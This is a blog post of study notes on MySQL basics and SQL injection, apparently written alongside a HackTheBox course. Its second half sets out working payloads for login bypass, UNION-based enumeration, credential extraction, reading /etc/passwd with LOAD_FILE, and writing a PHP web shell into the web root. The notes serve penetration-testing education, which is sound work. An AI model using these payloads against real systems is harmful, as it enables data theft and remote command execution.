---
layout: post
title: Introduction to SQL Injection
date: 2025-12-10 9:45
categories:
  - Web Pentesting
tags:
  - Brute-Force Attacks
  - Password Attacks
  - Authentication Bypasses
---
# Intro to SQLi
**SQL Injection** is a web security vulnerability that happens when an application does not safely handle user input. A malicious user can insert (“inject”) crafted SQL commands into input fields (such as login forms, search boxes, or URL parameters). These inputs then alter the intended SQL query sent to the database. As a result, the attacker can execute unauthorized SQL operations, such as reading, modifying, or deleting data.
## Databases
###  Structured Query Language (SQL)
used to perform the following actions:

- Retrieve data
- Update data
- Delete data
- Create new tables and databases
- Add / remove users
- Assign permissions to these users
  
 To log  in as the superuser, i.e.,"`root`" with the password "`password`,"  to have privileges to execute all commands
```shell
mysql -u root -p
```   
```shell
 mysql -u root -p<password> #this should be avoided, as it could lead to the password being kept in logs and terminal history
```

We can view which privileges we have using the [SHOW GRANTS](https://dev.mysql.com/doc/refman/8.0/en/show-grants.html) command
`localhost` server is the default
We can specify a remote host and port using the `-h` and `-P` flags.

```shell
mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```
(3306)  = The default MySQL/MariaDB port.
 Uppercase `P`  used for ports.
 Lowercase `p` used for passwords.
- To  log in to the database using the `mysql` utility
 ```shell
mysql -h STMIP -P STMPO -u root -ppassword
```
####  Creating a database
To create a new database named `users`:
```mysql
 CREATE DATABASE users;
```
 To view the list of databases
```mysql
SHOW DATABASES;
```
To switch to the `users` database
```mysql
USE users;
```

> [!NOTE] 
> - SQL statements aren't case sensitive
> - The database name is case sensitive

#### Tables

To create a table named `logins` to store user data, using the [CREATE TABLE](https://dev.mysql.com/doc/refman/8.0/en/creating-tables.html) SQL query:

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```
the `CREATE TABLE` query first specifies the table name, and then (within parentheses) we specify each column by its name and its data type, all being comma separated.
>- ` VARCHAR(100)`  = set to strings of 100 characters each. Any input longer than this will result in an error.
>- The `date_of_joining` column of type `DATETIME` stores the date when an entry was added.
>
> - A complete list of data types in MySQL can be found [here](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)

To show a list of tables in the current database
```mysql
SHOW TABLES;
```
The [DESCRIBE](https://dev.mysql.com/doc/refman/8.0/en/describe.html) keyword is used to list the table structure with its fields and data types.
```mysql
DESCRIBE logins;
```
---

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```
`AUTO_INCREMENT` keyword : automatically increments the id by one every time a new item is added to the table.
 `NOT NULL` constraint ensures that a particular column is never left empty 'i.e., required field.
 `UNIQUE` constraint to ensures that the inserted item are always unique.
 
To  set the default value to [Now()](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now)
```sql
    date_of_joining DATETIME DEFAULT NOW(),
```
- To uniquely identify each record in the table, referring to all data of a record within a table for relational databases
```MYsql
 PRIMARY KEY (id)
```

---
#### SQL Statements
##### INSERT Statement
 
  used to add new records to a given table.
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```
```mysql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```
We can skip filling columns with default values, such as `id` and `date_of_joining`. This can be done by specifying the column names to insert values into a table selectively:
```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```
To insert values into the `logins` table:
```MySQL
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```

> [!NOTE] 
> Passwords should always be hashed/encrypted before storage

We can also insert multiple records at once by separating them with a comma:
```mysql
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

##### SELECT Statement
To select all the columns from specific table:
```sql
SELECT * FROM table_name;
```
To view data present in specific columns:
```sql
SELECT column1, column2 FROM table_name;
```
##### DROP Statement
 [DROP](https://dev.mysql.com/doc/refman/8.0/en/drop-table.html) :used to remove tables and databases from the server.
 ```mysql
DROP TABLE logins;
```

> [!NOTE] 
>The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.
##### ALTER Statement
 To add a new column `newColumn` to the `logins` table using `ADD`:
```MySQL
 ALTER TABLE logins ADD newColumn INT;
```
To rename a column, we can use `RENAME COLUMN`:
```MySQL
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```
We can also change a column's datatype with `MODIFY`:
```MySQL
 ALTER TABLE logins MODIFY newerColumn DATE;
```
We can drop a column using `DROP`:
```MySQL
ALTER TABLE logins DROP newerColumn;
```
##### UPDATE Statement
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```
```sQL
 UPDATE logins SET password = 'change_password' WHERE id > 1;
```
#### Query Results
##### Sorting Results
```MySQL
SELECT * FROM logins ORDER BY password;
```
```MySQL
SELECT * FROM logins ORDER BY password DESC;
```

> [!NOTE] 
>By default, the sort is done in ascending order, but we can also sort the results by `ASC` or `DESC`
```MySQL
SELECT * FROM logins ORDER BY password DESC, id ASC;
```
##### LIMIT results
```MySQL
SELECT * FROM logins LIMIT 2;
```
If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
```MySQL
 SELECT * FROM logins LIMIT 1, 2;
```

> [!NOTE] 
>  the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

##### WHERE Clause
To filter or search for specific data, we can use conditions with the `SELECT` statement using the [WHERE](https://dev.mysql.com/doc/refman/8.0/en/where-optimization.html) clause
```sql
SELECT * FROM table_name WHERE <condition>;
```
```SQL
SELECT * FROM logins WHERE id > 1;
```
```sQL
SELECT * FROM logins where username = 'admin';
```

> [!NOTE] 
>  String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.

##### LIKE Clause
To retrieve all records with usernames starting with `admin`:
```sQL
SELECT * FROM logins WHERE username LIKE 'admin%';
```
 `%`: match zero or more characters.
 `_`: match exactly one character.
 `___`:  three characters
```sql
SELECT * FROM logins WHERE username like '___';
```
#### SQL Operators
#####  Logical Operators
##### AND Operator
The result of the `AND` operation is `true` if and only if both `condition1` and `condition2` evaluate to `true`:
```sql
condition1 AND condition2
```
```sql
SELECT 1 = 1 AND 'test' = 'test';
```
```sql
SELECT 1 = 1 AND 'test' = 'abc';
```
##### OR Operator
The `OR` operator takes in two expressions as well, and returns `true` when at least one of them evaluates to `true`:
```sql
SELECT 1 = 1 OR 'test' = 'abc';
```
```sql
 SELECT 1 = 2 OR 'test' = 'abc';
```
##### NOT Operator
The `NOT` operator simply toggles a `boolean` value 'i.e. `true` is converted to `false` and vice versa':
```sql
SELECT NOT 1 = 1;
```
// 0
```sql
 SELECT NOT 1 = 2;
```
// 1
##### Symbol Operators:
 The `AND`, `OR` and `NOT` operators can also be represented as `&&`, `||` and `!`
##### Operators in queries
 
```MySQL
SELECT * FROM logins WHERE username != 'john';
```
```MySQL
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```
#### Multiple Operator Precedence
- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)
  Operations at the top are evaluated before the ones at the bottom of the list
# SQL Injections
  
  ```php
$conn = new mysqli("localhost", "root", "password", "users");//Connects to a database.
$query = "select * from logins"; //Requests all the login data.
$result = $conn->query($query);//Stores the result.
```

```php
while($row = $result->fetch_assoc() ){ 
     // Goes through every record from the database & Shows only the name                                                                                         field for each record.
    echo $row["name"]."<br>";
    // Prints each name on a new line.
}
```


```php
$searchInput =  $_POST['findUser'];
//takes the text the user typed in a form (input named `findUser`) & stores that text in the variable `$searchInput`.
$query = "select * from logins where username like '%$searchInput'"; 
//creates a request to the database.
$result = $conn->query($query);
//This sends the search request to the database & stores the response in $result.
```
```php
'%1'; DROP TABLE users;'
```
How would we be able to inject into the SQL query then successfully?

One answer is by using `comments`, and we will discuss this in a later section. Another is to make the query syntax work by passing in multiple single quotes.
![[Pasted image 20251209235856.png]]
## Subverting Query Logic
### Authentication Bypass
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

---------
try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:
```
' = %27(URL Encoded)
" =%22
#= %23
; = %3B
) = %29
```

---
### OR Injection
We would need the query always to return `true`, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the `OR` operator in our SQL injection.
As previously discussed, the MySQL documentation for [operation precedence](https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html) states that the `AND` operator would be evaluated before the `OR` operator. This means that if there is at least one `TRUE` condition in the entire query along with an `OR` operator, the entire query will evaluate to `TRUE` since the `OR` operator returns `TRUE` if one of its operands is `TRUE`.
```
'1'='1'
```
//  always return `true`
However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.
```sql
admin' or '1'='1
```
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
The `AND` operator is evaluated first:

- `'1'='1'` is `True`.
- `password='something'` is `False`.
- The result of the `AND` condition is `False` because `True AND False` is `False`.

Next, the `OR` operator is evaluated:

- If `username='admin'` exists, the entire query returns `True`.
- The `'1'='1'` condition is irrelevant in this context because it doesn't affect the outcome of the `AND` condition.
  ![[Pasted image 20251210005625.png]]
  [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
  ### Auth Bypass with OR operator
```
  something' or '1'='1
```
![[Pasted image 20251210010524.png]]
The additional `OR` condition resulted in a `true` query overall, as the `WHERE` clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return `true`, we do not have to provide a test username and password and can directly start with the `'` injection and log in with just `' or '1' = '1`.
![[Pasted image 20251210010715.png]]
```
' or '1' = '1
```
##  Using Comments
 `--` ,  `#` and `/**/`
 

> [!NOTE] 
> In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.
> Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

```sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

// The server will ignore the part of the query with `AND password = 'something'` during evaluation.
### Auth Bypass with comments

```
 admin'--
```
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
```
admin')--
```
```sql
SELECT * FROM logins where (username='admin')
```
## Union Clause
### Union
 The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements.
 ```sql
 SELECT * FROM ports UNION SELECT * FROM ships;
```
#### Even Columns
 `UNION` statement can only operate on `SELECT` statements with an equal number of columns. For example, if we attempt to `UNION` two queries that have results with a different number of columns, we get the following error:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```
The above query would return `username` and `password` entries from the `passwords` table, assuming the `products` table has two columns.
#### Un-even Columns
 we can put junk data for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.

> [!NOTE]
>  - When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
>  -  For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
```sql
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
```
## Union Injection
### Detect number of columns
#### Using ORDER BY
we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

If we failed at `order by 4`, this means the table has three columns, which is the number of columns we were able to sort by successfull
```sql
' order by 1-- -
```
```sql
' order by 2-- -
```
We do the same for column `3` and `4` and get the results back till we get an error.
#### Using UNION
The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column `UNION` query:
```sql
cn' UNION select 1,2,3-- -
```
```sql
cn' UNION select 1,2,3,4-- -
```
and so on till  we successfully get the results.

---
#### Location of Injection

When performing **UNION SQL Injection**, the database query may return many columns, but the web page doesn’t always show all of them. Some columns (such as IDs) are used internally and are **not displayed**, so if we inject into those columns, we won’t see our output.

To find which columns are printed, attackers often use numbers as placeholder values (e.g., `1,2,3,4`). The numbers that appear on the page are the columns that are actually printed. Once we know which columns are visible, we can place our payload in any of those visible columns.

For example, replacing one of the visible numbers with `@@version` (a command that returns the database version):

```
cn' UNION select 1,@@version,3,4-- -
```

The page displays the database version, which proves we can retrieve real data.
# Exploitation
## Database Enumeration
## MySQL Fingerprinting
 - `Apache` or `Nginx` :  the webserver is running on Linux, so the DBMS is likely `MySQL`
 
 Payloads
```
  SELECT @@version
  SELECT POW(1,1)
 SELECT SLEEP(5)
```
### INFORMATION_SCHEMA Database
```sql
SELECT * FROM my_database.users;
```
```sql
 SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

We ignore mysql, information_schema, performance_schema & sys

using a `UNION` SQL injection:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```
```sql
cn' UNION select 1,database(),2,3-- -
```
#### TABLES
- The `TABLE_NAME` column stores table names
- the `TABLE_SCHEMA` column points to the database each table belongs to.
  ```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
#### COLUMNS
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
#### Data
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

## Reading Files
### Privileges
#### DB User
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
Our `UNION` injection payload :
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
#### User Privileges
To test if we have super admin privileges:
```sql
SELECT super_priv FROM mysql.user
```
 `UNION` injection payload :
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
### LOAD_FILE
The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name.
```sql
SELECT LOAD_FILE('/etc/passwd');
```

> [!NOTE] 
>Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.

`UNION` injection:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
### Another Example

 the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```
- The HTML source can be viewed by hitting `[Ctrl + U]`.
 
## Writing Files

 To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

 
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. `MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.

We have to select these two columns from that table in the `INFORMATION_SCHEMA` database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the `secure_file_priv` variable, using the `WHERE` clause we learned about in a previous section.

The final SQL query is the following:
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
 `UNION` injection:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

#### SELECT INTO OUTFILE
```sQL
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
```shell
cat /tmp/credentials 
```
It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
```shell
 cat /tmp/test.txt 
```

```
ls -la /tmp/test.txt 
```

> [!NOTE] 
> Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
### Writing Files through SQL Injection
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```


> [!NOTE] 
>**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
 
 `UNION` injection payload:
 ```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
### Writing a Web Shell
```php
<?php system($_REQUEST[0]); ?>
```
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
 `?0=id`
 
